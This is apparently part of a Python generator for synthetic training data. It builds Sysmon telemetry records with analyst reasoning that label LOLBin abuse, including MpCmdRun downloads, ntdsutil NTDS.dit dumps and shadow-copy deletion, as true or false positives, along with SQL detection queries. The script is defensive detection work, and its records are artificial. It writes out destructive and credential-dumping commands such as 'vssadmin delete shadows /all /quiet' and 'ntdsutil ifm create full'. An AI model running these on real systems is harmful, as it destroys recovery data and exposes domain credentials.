              f"    file_is_not_definition_update=YES  extension_is_executable=YES\n"
              f"  EventID=1 (subsequent execution)\n"
              f"    Image: {dest}  ParentImage: {parent}  PID={child_pid}")

    cot = _cot(
        "MpCmdRun.exe is the Windows Defender command-line interface -- used for scanning, "
        "definition updates, and diagnostics. Legitimate MpCmdRun.exe network connections: "
        "to *.update.microsoft.com or *.wdcp.microsoft.com for definition downloads. "
        "It never uses -DownloadFile in normal operation (that's an undocumented attacker feature).",
        f"-DownloadFile flag is not used by Windows Defender automation -- it's a feature "
        f"discovered by red teamers. MpCmdRun outbound to {ext_url.split('/')[2]} "
        "(not Microsoft update server) = downloading attacker payload. "
        f"File {dest} written to %TEMP% (not %ProgramData%\\Microsoft\\Windows Defender\\) = "
        "not a definition update. Subsequent execution of downloaded file = full delivery chain.",
        f"Host {host} ({user}): MpCmdRun.exe used as downloader. "
        f"Payload downloaded from {ext_url.split('/')[2]} and executed.",
        f"MpCmdRun.exe LOLBAS downloader confirmed -- {desc}.",
        "MITRE T1105 (Ingress Tool Transfer). "
        f"Delete {dest}, block source IP, kill PID={child_pid}, investigate {parent}.",
    )
    return prompt, cot, "true_positive"

def _mpcmd_fp(i):
    prompt = (f"Windows Host Telemetry -- Defender Definition Update.\n"
              f"  EventID=1  Image: MpCmdRun.exe  ParentImage: MsMpEng.exe\n"
              f"    CommandLine: MpCmdRun.exe -SignatureUpdate\n"
              f"    triggered_by_MsMpEng=YES  no_DownloadFile_flag=YES\n"
              f"  EventID=3  DestinationIp=update.microsoft.com  DestinationPort=443\n"
              f"  EventID=11  TargetFilename=...mpas-fe.exe  (definition update file)\n"
              f"    file_written_to_WD_definitions_dir=YES")
    cot = _cot(
        "MsMpEng triggering definition update via -SignatureUpdate. Microsoft update server. "
        "No -DownloadFile. File written to WD definitions directory.",
        "MsMpEng parent. -SignatureUpdate (not -DownloadFile). Microsoft CDN. "
        "Definition directory target.",
        "Authorized WD definition update -- MsMpEng, -SignatureUpdate, Microsoft CDN.",
        "WD definition update -- MsMpEng parent, -SignatureUpdate, Microsoft CDN.",
        "T1105 -- AUTHORIZED DEFINITION UPDATE. No action.",
        action="dismiss",
    )
    return prompt, cot, "false_positive"


# ═══════════════════════════════════════════════════════════════════════════════
# 23. NTDSUtilIFMDump
#     Source: T1003.003 -- ntdsutil IFM creates installable media of AD database
#     Chain: ntdsutil "ac i ntds" "ifm" "create full C:\temp\ifm" q q
#            Creates copy of NTDS.dit + SYSTEM hive in target directory
#            IFM is designed for DC promotion but used for offline hash extraction
#     Evidence: EventID 1 (ntdsutil with "ifm" and "create" keywords) +
#               EventID 11 (ntds.dit written to temp/non-standard path) +
#               EventID 1 (subsequent impacket/secretsdump/DSInternals)
#     Admin FP: legitimate IFM for DC promotion in planned DR/expansion
# ═══════════════════════════════════════════════════════════════════════════════

def _ntdsutil_tp(i):
    host  = f"DC{random.randint(1,5):02d}"
    user  = random.choice(["jsmith","rbrown","schen"])
    dest  = random.choice([
        f"C:\\Users\\{user}\\AppData\\Local\\Temp\\ifm",
        f"C:\\Windows\\Temp\\ifm_{random.randint(100,999)}",
        f"C:\\ProgramData\\{''.join(random.choices('abcdef',k=4))}\\ifm",
    ])
    parent = random.choice(["cmd.exe","powershell.exe"])

    variants = [
        (f"ntdsutil.exe \"ac i ntds\" \"ifm\" \"create full {dest}\" q q",
         "ntdsutil IFM full AD database dump (NTDS.dit + SYSTEM hive)"),
        (f"ntdsutil.exe \"activate instance ntds\" \"ifm\" \"create sysvol full {dest}\" quit quit",
         "ntdsutil IFM with SYSVOL -- extracts full domain data"),
    ]
    cmdline, desc = variants[i % len(variants)]
    ntds_path = f"{dest}\\Active Directory\\ntds.dit"
    child_pid = _pid()

    prompt = (f"Windows Host Telemetry -- ntdsutil IFM NTDS.dit Extraction.\n"
              f"Host: {host}  (Domain Controller)\n"
              f"User: {user}  (NOT a domain backup operator -- unexpected)\n"
              f"  EventID=1 (Process Create)\n"
              f"    Image: ntdsutil.exe  ParentImage: {parent}\n"
              f"    CommandLine: {cmdline[:100]}...\n"
              f"    ({desc})\n"
              f"    ifm_keyword=YES  create_keyword=YES  dest_is_not_backup_share=YES\n"
              f"  EventID=11 (FileCreate)\n"
              f"    Image: ntdsutil.exe  TargetFilename: {ntds_path}\n"
              f"    ntds_dit_written_outside_DataDirectory=YES\n"
              f"  subsequent: EventID=1\n"
              f"    Image: python.exe (impacket) / DSInternals.psd1  ParentImage: {parent}\n"
              f"    PID={child_pid}  (reading {ntds_path} for hash extraction)")

    cot = _cot(
        "ntdsutil IFM is a legitimate feature for creating bootable DC media used when "
        "promoting a new DC from install media. Authorized IFM runs: by Domain Admins or "
        "Backup Operators, with a change ticket, writing to a network backup share (not temp), "
        "during planned DC promotions.",
        f"IFM dump by {user} (not listed as Domain Backup Operator) to {dest} (temp path, "
        "not authorized backup share). No change ticket context. "
        "Followed immediately by impacket/DSInternals reading the ntds.dit = "
        "offline hash extraction. ntdsutil IFM bypasses NTDS VSS requirements -- "
        "provides a clean copy for secretsdump.",
        f"DC {host}: {user} extracted NTDS.dit via ntdsutil IFM to {dest}. "
        "Subsequent secretsdump activity confirms credential theft.",
        f"ntdsutil IFM dump confirmed -- {desc}.",
        "MITRE T1003.003 (OS Credential Dumping: NTDS). "
        f"Delete {dest}, reset all AD credentials, investigate {user} account, "
        "assume full domain compromise.",
    )
    return prompt, cot, "true_positive"

def _ntdsutil_fp(i):
    prompt = (f"Windows Host Telemetry -- Authorized DC Promotion IFM.\n"
              f"  EventID=1  Image: ntdsutil.exe  ParentImage: dcpromo.exe\n"
              f"    CommandLine: ntdsutil.exe \"activate instance ntds\" \"ifm\" "
              f"\"create sysvol full \\\\backupserver\\DCMedia\" quit quit\n"
              f"    dest_is_authorized_backup_share=YES  (UNC path, not local temp)\n"
              f"  user=svc-domain-backup  (Domain Backup Operator group)\n"
              f"  no_subsequent_secretsdump=YES  change_ticket=CHG-{random.randint(10000,99999)}")
    cot = _cot(
        "Authorized IFM for DC promotion -- backup operator, network share destination, "
        "change ticket, dcpromo parent. No subsequent secretsdump.",
        "dcpromo parent. Backup Operator account. Network share destination. "
        "Change ticket. No secretsdump follow-on.",
        "Authorized DC promotion IFM -- backup operator, network share, change ticket.",
        "DC IFM for promotion -- dcpromo parent, backup operator, network share.",
        "T1003.003 -- AUTHORIZED DC PROMOTION IFM. No action.",
        action="dismiss",
    )
    return prompt, cot, "false_positive"


# ═══════════════════════════════════════════════════════════════════════════════
# 24. VssadminShadowDelete
#     Source: T1490 -- vssadmin delete shadows pre-ransomware indicator
#     Chain: vssadmin delete shadows /all /quiet →
#            wmic shadowcopy delete →
#            bcdedit /set {default} recoveryenabled No →
#            wbadmin delete catalog -quiet
#            Combined = eliminating all recovery options before ransomware encryption
#     Evidence: EventID 1 (vssadmin delete shadows / wmic shadowcopy delete) +
#               EventID 1 (bcdedit modifying recovery settings) +
#               Temporal correlation: shadow delete + bcdedit + mass file rename
#     Admin FP: authorized cleanup of old shadow copies per retention policy
# ═══════════════════════════════════════════════════════════════════════════════

def _vss_tp(i):
    host = _host(); user = _user()
    parent   = random.choice(["cmd.exe","powershell.exe","wscript.exe"])
    child_pid = _pid()

    variants = [
        ("vssadmin.exe delete shadows /all /quiet",
         "delete all VSS shadow copies silently (pre-ransomware)"),
        ("wmic.exe shadowcopy delete",
         "WMI-based shadow copy deletion (alternate method)"),
        ("bcdedit.exe /set {default} recoveryenabled No",
         "disable Windows Recovery Environment (eliminates boot-time recovery)"),
    ]
    cmdline, desc = variants[i % len(variants)]
    ransomware_context = random.choice([
        "mass_file_rename_detected_same_hour=YES (*.encrypted extension)",
        "ransomware_note_TXT_written_to_Desktop=YES",
        "veeam_service_stopped_5min_before=YES",
    ])

    prompt = (f"Windows Host Telemetry -- Pre-Ransomware Shadow Copy Deletion.\n"
              f"Host: {host}  User: {user}\n"
              f"  EventID=1 (Process Create)\n"
              f"    Image: {'vssadmin.exe' if 'vssadmin' in cmdline else cmdline.split('.')[0]+'.exe'}\n"
              f"    ParentImage: {parent}\n"
              f"    CommandLine: {cmdline}\n"
              f"    ({desc})\n"
              f"  correlated_ransomware_indicators:\n"
              f"    {ransomware_context}\n"
              f"    user_is_not_backup_admin=YES\n"
              f"    no_change_ticket=YES  no_backup_software_parent=YES\n"
              f"  temporal_cluster: shadow_delete + bcdedit + wbadmin_delete within 120s")

    cot = _cot(
        "Backup admins delete old shadow copies per retention policy. Authorized: "
        "scheduled via backup software (Veeam, BackupExec), by backup operator accounts, "
        "with change tickets, deleting specific old copies (not ALL). "
        "Ransomware typically deletes ALL shadows (/all /quiet) without a ticket.",
        f"vssadmin delete shadows /all = ALL shadows deleted at once (not selective). "
        "/quiet = suppressing prompts (automation/malware pattern). "
        f"User {user} is not a backup operator. No change ticket. {ransomware_context}. "
        "Temporal cluster of shadow delete + bcdedit + file rename within 2 minutes = "
        "ransomware deployment chain. Shadow deletion is the first step before encryption.",
        f"Host {host} ({user}): shadow copies deleted pre-ransomware. "
        f"{ransomware_context}. Recovery options eliminated.",
        f"Pre-ransomware shadow deletion confirmed -- {desc}.",
        "MITRE T1490 (Inhibit System Recovery). "
        f"CRITICAL: Isolate {host} immediately. Check for lateral spread. "
        "Preserve remaining encrypted files for recovery. Alert IR team.",
    )
    return prompt, cot, "true_positive"

def _vss_fp(i):
    prompt = (f"Windows Host Telemetry -- Authorized Retention Policy Shadow Cleanup.\n"
              f"  EventID=1  Image: vssadmin.exe  ParentImage: BackupExec.exe\n"
              f"    CommandLine: vssadmin delete shadows /for=C: /oldest\n"
              f"    /oldest_not_all=YES  (deleting oldest only -- retention policy)\n"
              f"  user=svc-backup  (Backup Operators group)\n"
              f"  no_ransomware_indicators=YES  no_bcdedit=YES\n"
              f"  change_ticket=CHG-{random.randint(10000,99999)}")
    cot = _cot(
        "BackupExec deleting oldest shadow only (not /all). Backup operator. "
        "Change ticket. No ransomware correlation.",
        "BackupExec parent. /oldest (not /all). Backup operator. Change ticket. "
        "No ransomware context.",
        "Authorized retention cleanup -- /oldest, BackupExec, backup operator.",
        "vssadmin /oldest cleanup -- BackupExec parent, backup operator, change ticket.",
        "T1490 -- AUTHORIZED RETENTION CLEANUP. No action.",
        action="dismiss",
    )
    return prompt, cot, "false_positive"


# ═══════════════════════════════════════════════════════════════════════════════
# Registry + Main
# ═══════════════════════════════════════════════════════════════════════════════

TOOL_CLASSES = {
    "BinaryProxyMshta":        ("sysmon_sensor", ["T1218.005"],                     _mshta_tp, _mshta_fp),
    "BinaryProxyRegsvr32":     ("sysmon_sensor", ["T1218.010"],                     _reg32_tp, _reg32_fp),
    "BinaryProxyRundll32":     ("sysmon_sensor", ["T1218.011","T1003.001"],         _rd32_tp,  _rd32_fp),
    "CertutilLOLBin":          ("sysmon_sensor", ["T1105","T1140"],                 _certutil_tp, _certutil_fp),
    "BITSJobAbuse":            ("sysmon_sensor", ["T1197"],                         _bits_tp,  _bits_fp),
    "InstallUtilBypass":       ("sysmon_sensor", ["T1218.004"],                     _iu_tp,    _iu_fp),
    "MSBuildInlineTask":       ("sysmon_sensor", ["T1127.001"],                     _msbuild_tp, _msbuild_fp),
    "DnsAdminsDLLAbuse":       ("sysmon_sensor", ["T1547.013"],                     _dns_tp,   _dns_fp),
    "RegistryFilelessLOL":     ("sysmon_sensor", ["T1620","T1112","T1547.001"],     _regfill_tp, _regfill_fp),
    "WSHScriptletProxy":       ("sysmon_sensor", ["T1059.005"],                     _wsh_tp,       _wsh_fp),
    "OfficeDDEExecution":      ("sysmon_sensor", ["T1559.002"],                     _dde_tp,       _dde_fp),
    "PowerShellNetworkC2":     ("sysmon_sensor", ["T1059.001","T1071.001"],         _psnc2_tp,     _psnc2_fp),
    "WmicProxyExecution":      ("sysmon_sensor", ["T1047"],                         _wmic_tp,      _wmic_fp),
    "CmstpBypass":             ("sysmon_sensor", ["T1218.003"],                     _cmstp_tp,     _cmstp_fp),
    "MsiexecRemoteInstall":    ("sysmon_sensor", ["T1218.007"],                     _msie_tp,      _msie_fp),
    "OdbcconfDLLLoad":         ("sysmon_sensor", ["T1218.008"],                     _odbc_tp,      _odbc_fp),
    "RegasmComBypass":         ("sysmon_sensor", ["T1218.009"],                     _regasm_tp,    _regasm_fp),
    "EsentutlStagingCopy":     ("sysmon_sensor", ["T1105","T1003.002","T1003.003"], _esent_tp, _esent_fp),
    "DiskshadowScriptExec":    ("sysmon_sensor", ["T1490","T1006"],                 _dsh_tp,       _dsh_fp),
    "WslBashBypass":           ("sysmon_sensor", ["T1202"],                         _wsl_tp,       _wsl_fp),
    "ForfilesCmdProxy":        ("sysmon_sensor", ["T1202"],                         _forfiles_tp,  _forfiles_fp),
    "MpCmdRunDownload":        ("sysmon_sensor", ["T1105"],                         _mpcmd_tp,     _mpcmd_fp),
    "NTDSUtilIFMDump":         ("sysmon_sensor", ["T1003.003"],                     _ntdsutil_tp,  _ntdsutil_fp),
    "VssadminShadowDelete":    ("sysmon_sensor", ["T1490"],                         _vss_tp,       _vss_fp),
}

S3_QUERIES = {
    "BinaryProxyMshta": {
        "sensor": "sysmon_sensor",
        "where":  ("sysmon_event_id = 1 AND ParentImage LIKE '%mshta%' "
                   "AND (Image LIKE '%cmd%' OR Image LIKE '%powershell%')"),
    },
    "BinaryProxyRegsvr32": {
        "sensor": "sysmon_sensor",
        "where":  ("sysmon_event_id = 3 AND Image LIKE '%regsvr32%' "
                   "AND Initiated = 'true' AND DestinationPort IN (80,443)"),
    },
    "BinaryProxyRundll32": {
        "sensor": "sysmon_sensor",
        "where":  ("sysmon_event_id = 1 AND Image LIKE '%rundll32%' "
                   "AND CommandLine LIKE '%javascript%'"),
    },
    "CertutilLOLBin": {
        "sensor": "sysmon_sensor",
        "where":  ("sysmon_event_id = 3 AND Image LIKE '%certutil%' "
                   "AND Initiated = 'true'"),
    },
    "BITSJobAbuse": {
        "sensor": "sysmon_sensor",
        "where":  ("sysmon_event_id = 1 AND (Image LIKE '%bitsadmin%' "
                   "AND CommandLine LIKE '%transfer%') "
                   "OR CommandLine LIKE '%Start-BitsTransfer%'"),
    },
    "InstallUtilBypass": {
        "sensor": "sysmon_sensor",
        "where":  ("sysmon_event_id = 1 AND Image LIKE '%InstallUtil%' "
                   "AND CommandLine LIKE '%/U%'"),
    },
    "MSBuildInlineTask": {
        "sensor": "sysmon_sensor",
        "where":  ("sysmon_event_id = 1 AND Image LIKE '%MSBuild%' "
                   "AND CommandLine NOT LIKE '%.sln%' "
                   "AND Image NOT LIKE '%devenv%'"),
    },
    "DnsAdminsDLLAbuse": {
        "sensor": "sysmon_sensor",
        "where":  ("sysmon_event_id = 13 AND TargetObject LIKE '%DNS%Parameters%ServerLevelPluginDll%' "
                   "AND Image LIKE '%dnscmd%'"),
    },
    "RegistryFilelessLOL": {
        "sensor": "sysmon_sensor",
        "where":  ("sysmon_event_id = 13 AND TargetObject LIKE '%CurrentVersion%Run%' "
                   "AND Details LIKE '%Assembly%Load%'"),
    },
    "WSHScriptletProxy": {
        "sensor": "sysmon_sensor",
        "where":  ("sysmon_event_id = 1 AND (Image LIKE '%wscript%' OR Image LIKE '%cscript%') "
                   "AND (ParentImage LIKE '%WINWORD%' OR ParentImage LIKE '%EXCEL%')"),
    },
    "OfficeDDEExecution": {
        "sensor": "sysmon_sensor",
        "where":  ("sysmon_event_id = 1 AND Image LIKE '%cmd%' "
                   "AND (ParentImage LIKE '%WINWORD%' OR ParentImage LIKE '%EXCEL%') "
                   "AND sysmon_event_id != 7"),
    },
    "PowerShellNetworkC2": {
        "sensor": "sysmon_sensor",
        "where":  ("sysmon_event_id = 3 AND Image LIKE '%powershell%' "
                   "AND Initiated = 'true' "
                   "AND DestinationPort NOT IN (80,443,5985,5986)"),
    },
    "WmicProxyExecution": {
        "sensor": "sysmon_sensor",
        "where":  ("sysmon_event_id = 1 AND ParentImage LIKE '%WmiPrvSE%' "
                   "AND (Image LIKE '%cmd%' OR Image LIKE '%powershell%' OR Image LIKE '%cscript%')"),
    },
    "CmstpBypass": {
        "sensor": "sysmon_sensor",
        "where":  ("sysmon_event_id = 1 AND Image LIKE '%cmstp%' "
                   "AND CommandLine NOT LIKE '%Program Files%'"),
    },
    "MsiexecRemoteInstall": {
        "sensor": "sysmon_sensor",
        "where":  ("sysmon_event_id = 3 AND Image LIKE '%msiexec%' "
                   "AND Initiated = 'true' AND DestinationPort IN (80,443)"),
    },
    "OdbcconfDLLLoad": {
        "sensor": "sysmon_sensor",
        "where":  ("sysmon_event_id = 1 AND Image LIKE '%odbcconf%' "
                   "AND CommandLine LIKE '%REGSVR%'"),
    },
    "RegasmComBypass": {
        "sensor": "sysmon_sensor",
        "where":  ("sysmon_event_id = 1 AND (Image LIKE '%RegAsm%' OR Image LIKE '%RegSvcs%') "
                   "AND CommandLine LIKE '%/u%'"),
    },
    "EsentutlStagingCopy": {
        "sensor": "sysmon_sensor",
        "where":  ("sysmon_event_id = 1 AND Image LIKE '%esentutl%' "
                   "AND CommandLine LIKE '%/vss%'"),
    },
    "DiskshadowScriptExec": {
        "sensor": "sysmon_sensor",
        "where":  ("sysmon_event_id = 1 AND Image LIKE '%diskshadow%' "
                   "AND CommandLine LIKE '%/s%'"),
    },
    "WslBashBypass": {
        "sensor": "sysmon_sensor",
        "where":  ("sysmon_event_id = 1 AND (Image LIKE '%wsl.exe%' OR Image LIKE '%bash.exe%') "
                   "AND ParentImage NOT LIKE '%WindowsTerminal%' "
                   "AND ParentImage NOT LIKE '%Code%'"),
    },
    "ForfilesCmdProxy": {
        "sensor": "sysmon_sensor",
        "where":  ("sysmon_event_id = 1 AND Image LIKE '%forfiles%' "
                   "AND CommandLine LIKE '%/c%cmd%'"),
    },
    "MpCmdRunDownload": {
        "sensor": "sysmon_sensor",
        "where":  ("sysmon_event_id = 3 AND Image LIKE '%MpCmdRun%' "
                   "AND Initiated = 'true'"),
    },
    "NTDSUtilIFMDump": {
        "sensor": "sysmon_sensor",
        "where":  ("sysmon_event_id = 1 AND Image LIKE '%ntdsutil%' "
                   "AND CommandLine LIKE '%ifm%' AND CommandLine LIKE '%create%'"),
    },
    "VssadminShadowDelete": {
        "sensor": "sysmon_sensor",
        "where":  ("sysmon_event_id = 1 AND Image LIKE '%vssadmin%' "
                   "AND CommandLine LIKE '%delete%shadows%'"),
    },
}


def generate(tool_name, n_tp, n_fp):
    sensor, mitre, tp_fn, fp_fn = TOOL_CLASSES[tool_name]
    records = []
    for i in range(n_tp):
        prompt, cot, cls = tp_fn(i)
        records.append(_record(tool_name, sensor, mitre, _msg(sensor, prompt, cot), cls))
    for i in range(n_fp):
        prompt, cot, cls = fp_fn(i)
        records.append(_record(tool_name, sensor, mitre, _msg(sensor, prompt, cot), cls))
    return records


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--records-per-class",   type=int, default=10)
    ap.add_argument("--admin-fps-per-class", type=int, default=2)
    ap.add_argument("--tool-filter",         type=str, default="")
    args = ap.parse_args()

    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
    names = list(TOOL_CLASSES.keys())
    if args.tool_filter:
        names = [t.strip() for t in args.tool_filter.split(",")]

    all_records = []
    for name in names:
        recs = generate(name, args.records_per_class, args.admin_fps_per_class)
        all_records.extend(recs)
        tp = sum(1 for r in recs if r["classification"] == "true_positive")
        fp = sum(1 for r in recs if r["classification"] == "false_positive")
        logger.info(f"  {name}: {tp} TP + {fp} FP  ({TOOL_CLASSES[name][0]})")

    with open(OUTPUT_FILE, "w") as f:
        for r in all_records:
            f.write(json.dumps(r) + "\n")

    index = {
        "ttp_category":  TTP_CAT,
        "total_records": len(all_records),
        "tp_records":    sum(1 for r in all_records if r["classification"] == "true_positive"),
        "fp_records":    sum(1 for r in all_records if r["classification"] == "false_positive"),
        "tool_classes": {
            n: {"sensor": TOOL_CLASSES[n][0], "mitre_techniques": TOOL_CLASSES[n][1],
                "s3_query": S3_QUERIES.get(n)}
            for n in names
        },
    }
    with open(INDEX_FILE, "w") as f:
        json.dump(index, f, indent=2)

    logger.info(f"[+] {len(all_records)} total records → {OUTPUT_FILE}")
    logger.info(f"    {index['tp_records']} TP  |  {index['fp_records']} FP")
    logger.info(f"    Sensor: sysmon_sensor (windows_math)")


if __name__ == "__main__":
    main()
